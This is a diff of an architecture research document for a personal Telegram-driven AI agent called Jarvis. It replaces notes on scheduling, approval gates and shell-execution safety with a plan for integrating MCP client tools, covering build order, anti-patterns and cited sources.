-**Why it's wrong:** Adds coordination complexity (IPC), creates a second process to monitor, and requires the agent state (tool registry, memory manager) to be serialized across process boundaries.
-
-**Do this instead:** Run `node-cron` inside the bot process, passing the already-initialized dependencies directly to `runAgent()`. For a personal agent with a handful of daily tasks, the event loop handles this without issue.
-
-### Anti-Pattern 4: Hardcoded Scheduled Tasks
-
-**What people do:** Cron tasks defined as constants in code, requiring a deploy to change schedules.
-
-**Why it's wrong:** Jarvis needs to dynamically create/modify/delete tasks via Telegram and tools. Hardcoded tasks make the agent unable to manage its own schedule.
-
-**Do this instead:** Store tasks in the `scheduled_tasks` SQLite table. The scheduler reads from this table on startup and whenever a task is modified. The `schedule-task` tool becomes the management interface.
-
-### Anti-Pattern 5: Approval Gate Blocking the Event Loop
-
-**What people do:** A synchronous approval check that spins/sleeps waiting for user input.
-
-**Why it's wrong:** Node.js is single-threaded. Blocking the event loop freezes Telegram polling, meaning the user's approval response never arrives.
-
-**Do this instead:** Async/await with a stored Promise resolver. The approval gate stores a `(approved: boolean) => void` callback keyed by request ID. When the Telegram command handler fires, it looks up the ID and calls the callback. The event loop stays free throughout.
+---
 
 ## Integration Points
 
-### External Services
+### Agent Loop (`agent.ts`) — No Changes
 
-| Service | Integration Pattern | Notes |
-|---------|---------------------|-------|
-| Telegram Bot API | grammy long polling in TelegramChannel | Add command handlers for `/approve_*` and `/deny_*` patterns |
-| OpenRouter | HTTP POST via OpenRouterProvider | Model tier routing already implemented |
-| Web search API | HTTP GET in web-search tool | Use Brave Search API or Serper for reliability; DuckDuckGo is free but rate-limited |
-| Shell commands | child_process.spawn (no shell) | Never exec, never execSync for user-controlled commands |
-| Git (auto-update) | execSync("git pull") in supervisor | This is acceptable: fixed command, no user input |
+`runAgent()` signature is unchanged. It calls `toolRegistry.getDefinitions()` and `toolRegistry.execute()` — both unchanged. MCP tools are invisible to the agent loop.
 
-### Internal Boundaries
+### Tool Registry (`tool-registry.ts`) — No Changes
 
-| Boundary | Communication | Notes |
-|----------|---------------|-------|
-| Supervisor ↔ Bot | Exit codes (0=clean, 1=crash, 2=restart, 3=update) | Already implemented; add heartbeat file for hang detection |
-| Scheduler → Agent | Direct function call `runAgent()` | Pass all deps at startup; scheduler is initialized in `main()` |
-| Security Gate ↔ Telegram | Shared `approvalGate` singleton; Telegram calls `handleApprovalResponse()` | The gate module must be initialized with a `notify` callback pointing to `telegram.broadcast` |
-| Tool Registry → Security | Registry checks `tool.definition.riskLevel` before execute | All tool risk levels declared at registration time, not runtime |
-| Scheduler ↔ Database | Direct SQLite reads via memory-manager or dedicated prepared statements | Add `scheduled_tasks` table in `db.ts` migration |
+`ToolRegistry` is unchanged. MCP tools satisfy the `Tool` interface and register via the existing `register()` method. Name collision protection already exists (throws if a tool name is already registered) — the `__` namespace prefix prevents MCP tools from colliding with built-in tools.
 
-## Build Order Implications
+### `index.ts` — Three Additions
 
-Dependencies determine which components must be built before others:
+1. Load manifest (before tool registration)
+2. Start MCP manager + register adapted tools (after built-in tool registration)
+3. Disconnect MCP manager in shutdown block (before `db.close()`)
 
-1. **Security module first** (`src/security/`) — all new risky tools depend on it. Build command blacklist and approval gate before shell-exec or any high-risk tool.
+### Scheduler (`scheduler-manager.ts`) — No Changes
 
-2. **Web search + web scrape tools** — no new dependencies beyond fetch/Cheerio. These are pure tool additions and can be built immediately without touching security.
+The scheduler passes the same `toolRegistry` to `runAgent()`. Because MCP tools are in the registry by the time the scheduler starts, scheduled tasks can use MCP tools without any scheduler changes.
 
-3. **Shell execution tool** — depends on security module being in place. Build after security.
+### Security Layer (`security/`) — No Changes
 
-4. **Scheduler module + scheduled_tasks DB migration** — depends on `runAgent()` working (already exists) and DB schema. The `schedule-task` tool depends on the DB migration.
+MCP tools do not have `riskLevel` set by default (they come from third-party servers). The adapter can optionally read a `riskLevel` from the manifest config in a future version. For v1.1, MCP tools are treated as low-risk (no approval gate). This is acceptable because the user explicitly enabled them in the manifest.
 
-5. **Supervisor enhancements** — independent of bot process internals. Can be built at any phase.
+---
 
-Suggested phase ordering:
-- Phase 1: Web search + scraping (zero security risk, immediate user value)
-- Phase 2: Security module + code/shell execution (security infrastructure first, then the risky tool)
-- Phase 3: Scheduled tasks (needs DB migration + scheduler module; scheduler uses all existing tools including web search)
-- Phase 4: Supervisor improvements (independent, can be done alongside any other phase)
+## Build Order
+
+Dependencies determine which components must be built first:
+
+```
+1. tool-manifest.ts (ToolManifest interface + loadManifest())
+   — No dependencies. Pure file I/O + type definitions.
+   — Required by: index.ts changes, McpManager
+
+2. mcp-client.ts (McpClient wrapping SDK Client + StdioClientTransport)
+   — Depends on: @modelcontextprotocol/sdk (npm install)
+   — Required by: mcp-manager.ts
+
+3. mcp-tool-adapter.ts (adaptMcpTool function)
+   — Depends on: tool-types.ts (existing, unchanged), McpManager type
+   — Required by: mcp-manager.ts
+
+4. mcp-manager.ts (McpManager: startAll, callTool, disconnectAll)
+   — Depends on: mcp-client.ts, mcp-tool-adapter.ts, tool-manifest.ts
+   — Required by: index.ts
+
+5. index.ts changes (manifest loading + MCP startup + shutdown)
+   — Depends on: all of the above
+   — This is the integration point; build last
+```
+
+Suggested implementation order within the milestone:
+- **Phase 1:** `npm install @modelcontextprotocol/sdk zod` + implement `tool-manifest.ts` (schema + loader) + add `MCP_MANIFEST_PATH` to config + create `tools.manifest.json` template
+- **Phase 2:** Implement `mcp-client.ts` + `mcp-tool-adapter.ts` (adapter is simple, tightly coupled to client)
+- **Phase 3:** Implement `mcp-manager.ts` (ties client + adapter together)
+- **Phase 4:** Wire into `index.ts` (manifest-driven custom tool loading + MCP manager startup + shutdown)
+- **Phase 5:** Integration test: connect a real MCP server (e.g., `@modelcontextprotocol/server-filesystem`), verify tool appears in registry, verify agent can call it
+
+---
+
+## Anti-Patterns
+
+### Anti-Pattern 1: Making agent.ts MCP-Aware
+
+**What people do:** Add a separate code path in the agent loop for MCP tool calls — checking if a tool is MCP vs. built-in, then routing to a different executor.
+
+**Why it's wrong:** Destroys the single-responsibility of `agent.ts`. Tightly couples the agent loop to MCP implementation details. Makes the agent loop harder to test and maintain. The existing `Tool` interface exists precisely to abstract this distinction away.
+
+**Do this instead:** Adapt MCP tools to the `Tool` interface at registration time. The agent loop calls `toolRegistry.execute()` and never needs to know the tool's origin.
+
+### Anti-Pattern 2: Global McpClient Singletons
+
+**What people do:** Create a module-level `McpClient` singleton per server, imported directly by tool files (similar to how `setMemoryManager` is used in some built-in tools).
+
+**Why it's wrong:** Tool files should not know about MCP infrastructure. The adapter pattern (closure over McpManager reference) is cleaner — the tool's `execute` function carries the right McpManager reference without needing to know how it was created.
+
+**Do this instead:** `adaptMcpTool()` creates the `Tool` object with a closure over the `McpManager` instance. The manager is initialized in `index.ts` and passed to `adaptMcpTool()` — no global state.
+
+### Anti-Pattern 3: Registering MCP Tool Names Without Namespace Prefix
+
+**What people do:** Register the MCP tool name directly (e.g., `read_file`) without the server prefix.
+
+**Why it's wrong:** Two MCP servers can expose tools with the same name. A future MCP server might also collide with a built-in tool name. The `ToolRegistry` will throw on duplicate registration — causing a startup failure that is hard to debug.
+
+**Do this instead:** Always prefix with `{serverName}__`. The double underscore is a reliable separator that is unlikely to appear in tool names from any MCP server.
+
+### Anti-Pattern 4: Synchronous MCP Tool Connection at Startup
+
+**What people do:** Call `client.connect()` synchronously or without error handling — crashing startup if any MCP server is unavailable.
+
+**Why it's wrong:** An MCP server might be temporarily unavailable (server binary not installed, network issue for HTTP transport, etc.). Crashing Jarvis because a third-party server is down defeats the purpose of a reliable personal agent.
+
+**Do this instead:** Wrap each `McpClient.connect()` in a try/catch. Log the error and continue. The agent starts without that server's tools — which is preferable to not starting at all.
+
+### Anti-Pattern 5: Persistent MCP Client Reconnect Loops
+
+**What people do:** Implement automatic reconnection on disconnect — trying to re-connect the SDK Client to the same transport object after the server process dies.
+
+**Why it's wrong:** The MCP SDK (v1.x) does not support re-initializing a `Client` that has already connected and disconnected. A disconnected client requires a completely fresh `Client` + `StdioClientTransport` pair and a new `initialize` handshake. There is a known SDK issue (GitHub issue #510) where reconnect without re-initialize causes silent protocol failures. Reconnect logic that does not handle this correctly causes worse failures than the original disconnect.
+
+**Do this instead:** On disconnect (detected via error on `callTool`), mark the client as disconnected. Return a clear error to the LLM on any subsequent tool call. Let the user restart Jarvis if a server needs to be re-connected (acceptable for personal use). Do not attempt automatic reconnection in v1.1.
+
+---
+
+## Scaling Considerations
+
+This is a single-user personal agent on macOS. Scaling is not a concern. The considerations below are informational only.
+
+| Concern | Current Scale | If Scope Changes |
+|---------|---------------|-----------------|
+| MCP server process count | 1-5 servers is fine (each is a lightweight node process) | >10 concurrent servers would warrant pooling or lazy-connect |
+| Tool name collision | `__` prefix resolves this at scale | No change needed |
+| Stdio throughput | Adequate for LLM tool call rates (1-5 per agent run) | Switch to Streamable HTTP for high-frequency or remote servers |
+| MCP server startup latency | stdio servers start in <500ms typically | Lazy-connect (connect only when tool is first called) if startup time grows |
+
+---
 
 ## Sources
 
 - Direct codebase inspection: `/Users/max/Personal/repos/open-jarvis/src/` (HIGH confidence)
-- [CVE-2025-53372: Node.js Sandbox MCP Server command injection](https://github.com/advisories/GHSA-5w57-2ccq-8w95) (HIGH confidence — official GitHub Advisory)
-- [CVE-2025-68613: n8n sandbox escape via expression injection](https://www.penligent.ai/hackinglabs/cve-2025-68613-deep-dive-how-node-js-sandbox-escapes-shatter-the-n8n-workflow-engine/) (MEDIUM confidence — security research)
-- [Human-in-the-Loop Approval Framework patterns](https://agentic-patterns.com/patterns/human-in-loop-approval-framework/) (MEDIUM confidence — community patterns)
-- [Node.js child_process official docs](https://nodejs.org/api/child_process.html) (HIGH confidence — official docs)
-- [node-cron vs node-schedule comparison](https://npm-compare.com/cron,node-cron,node-schedule) (MEDIUM confidence — npm comparison)
-- [Cheerio vs Playwright for web scraping](https://proxyway.com/guides/cheerio-vs-puppeteer-for-web-scraping) (MEDIUM confidence — community guide)
+- `@modelcontextprotocol/sdk` v1.27.1 (current as of 2026-03-19): confirmed via `npm info @modelcontextprotocol/sdk version` (HIGH confidence)
+- [MCP TypeScript SDK docs — client usage](https://modelcontextprotocol.info/docs/tutorials/building-a-client-node/) — Client constructor, StdioClientTransport, listTools, callTool patterns (HIGH confidence)
+- [MCP SDK client.md — listTools/callTool signatures](https://github.com/modelcontextprotocol/typescript-sdk/blob/main/docs/client.md) (HIGH confidence — official SDK repo)
+- [MCP Transports — SSE deprecation, Streamable HTTP](https://modelcontextprotocol.io/docs/concepts/transports) (HIGH confidence — official spec)
+- [SSEClientTransport reconnect bug — GitHub issue #510](https://github.com/modelcontextprotocol/typescript-sdk/issues/510) — informs no-reconnect decision (MEDIUM confidence — specific to SSE, but pattern applies to stdio too)
+- [Why MCP deprecated SSE for Streamable HTTP](https://blog.fka.dev/blog/2025-06-06-why-mcp-deprecated-sse-and-go-with-streamable-http/) (MEDIUM confidence — community analysis, aligns with official spec)
 
 ---
-*Architecture research for: Jarvis personal AI agent — new capabilities milestone*
-*Researched: 2026-03-18*
+*Architecture research for: Jarvis v1.1 — MCP client integration, tool manifest, hybrid tool approach*
+*Researched: 2026-03-19*
